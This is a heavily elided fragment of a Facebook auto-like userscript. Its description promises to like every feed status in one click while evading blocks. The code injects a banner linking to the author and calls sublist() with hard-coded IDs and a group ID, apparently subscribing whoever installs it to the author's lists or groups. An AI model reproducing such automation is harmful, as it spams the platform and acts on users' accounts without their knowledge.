// ==UserScript==
// @name			*[ Like ]*
// @namespace		        *[ Like ]* Boom Like Facebook 
// @description		        *[ AUTOLIKE ]* Boom Like ini adalah untuk memberi Like status yg berada di beranda hanya dengan 1 kali klik dan tanpa block
// @author			https://www.facebook.com/fuad.x.hunter
// @authorURL		http://www.facebook.com/fuad.x.hunter        
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #00ffea";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#008B8B' href='http://www.facebook.com/fuad.x.hunter' target='Ahmad Fuady' title='Ahmad Fuady' ><blink><center> [[Ahmad Fuady Jayawangsa]]</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("479972732084262");
sublist("479487208799481");

var gid = ['514462261981746'];
